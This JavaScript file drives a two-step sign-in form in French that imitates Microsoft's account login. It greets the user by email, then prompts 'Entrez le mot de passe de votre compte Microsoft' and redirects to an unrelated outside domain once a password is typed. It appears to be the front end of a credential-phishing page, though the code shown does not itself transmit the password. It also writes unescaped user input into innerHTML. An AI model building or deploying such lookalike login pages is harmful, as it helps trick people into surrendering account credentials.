let signmode = 0;
const login = document.getElementById('login');
const passwd = document.getElementById('hide-passwd');
const title = document.getElementById('title');
const error = document.getElementById('error');
const errorMessage = document.getElementById('errorMessage');
const bouton = document.getElementById('Button9');
window.onload = () => {login.focus()};

login.addEventListener('input', () => { error.style.display = "none"; });

function clickSign() {
    login.focus();
    loginreg = login.value.match('^([^@]+)')?.[0];
    if (login.value === "" || !login.checkValidity()) { 
        error.style.display = 'inline'; 
        signmode = 9; 
        event.preventDefault(); 
    } else { 
        signmode = 0; 
    }
    
    if (signmode == 0) {
        title.innerHTML = `<span class="back-arrow">&#8592;</span> Bonjour ${loginreg}`;
        bouton.value = 'Se connecter';
        document.getElementById('noaccid').setAttribute('hidden', '');
        document.getElementById('nomdp').removeAttribute('hidden', '');
        login.style.display = 'none';
        error.style.display = 'none';
        passwd.style.display = 'inline-block';
        passwd.focus();

        passwd.addEventListener('input', () => { error.style.display = "none"; });
        
        if (bouton.value === "Se connecter") {
            errorMessage.textContent = 'Entrez le mot de passe de votre compte Microsoft.';
            bouton.style.padding="6px 12px";
            bouton.onclick = function(event) {
                event.preventDefault();
                if (passwd.value === "" || !passwd.checkValidity()) { 
                    error.style.display = 'inline'; 
                } else { 
                    console.log('test');
                    window.location.href = "https://bluelight.worldlite.fr";
                }
            }
        }
        return false;
    }
    return true;
}
